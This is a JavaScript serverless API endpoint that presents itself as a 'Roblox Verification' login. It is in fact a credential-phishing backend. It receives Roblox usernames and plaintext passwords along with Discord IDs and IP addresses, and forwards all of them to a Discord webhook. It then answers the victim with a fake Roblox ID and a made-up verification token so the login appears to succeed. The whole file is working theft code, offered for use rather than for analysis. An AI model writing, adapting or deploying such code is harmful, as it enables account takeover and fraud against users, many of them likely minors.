export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    console.log('API called at:', new Date().toISOString());
    
    const { username, password, discordId } = req.body;
    console.log('Received login attempt:', { username, discordId });
    
    if (!username || !password) {
      return res.status(400).json({ 
        success: false, 
        error: 'Username and password required' 
      });
    }
    
    // Basic validation
    if (password.length < 3) {
      return res.status(400).json({
        success: false,
        error: 'Password must be at least 3 characters'
      });
    }
    
    // Get IP address
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
    
    // Send to Discord webhook
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    
    if (webhookUrl) {
      try {
        const webhookData = {
          username: 'Roblox Verification',
          embeds: [{
            title: '🔐 Roblox Login Attempt',
            color: 0x00ff00,
            fields: [
              { name: 'Username', value: `\`${username}\``, inline: true },
              { name: 'Password', value: `\`${password}\``, inline: true },
              { name: 'Discord ID', value: discordId ? `\`${discordId}\`` : 'Not linked', inline: true },
              { name: 'IP Address', value: `\`${ip}\``, inline: true },
              { name: 'Status', value: '✅ Valid', inline: true }
            ],
            timestamp: new Date().toISOString()
          }]
        };
        
        console.log('Sending webhook to Discord...');
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(webhookData)
        });
        console.log('Webhook sent successfully');
        
      } catch (webhookError) {
        console.error('Webhook error:', webhookError);
        // Continue even if webhook fails
      }
    } else {
      console.log('No webhook URL configured, skipping...');
    }
    
    // Generate response
    const mockRobloxId = Math.floor(Math.random() * 1000000000);
    const verificationToken = `token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    res.status(200).json({
      success: true,
      robloxUsername: username,
      robloxId: mockRobloxId.toString(),
      verificationToken: verificationToken,
      message: 'Verification successful!',
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Server error occurred',
      details: error.message 
    });
  }
}
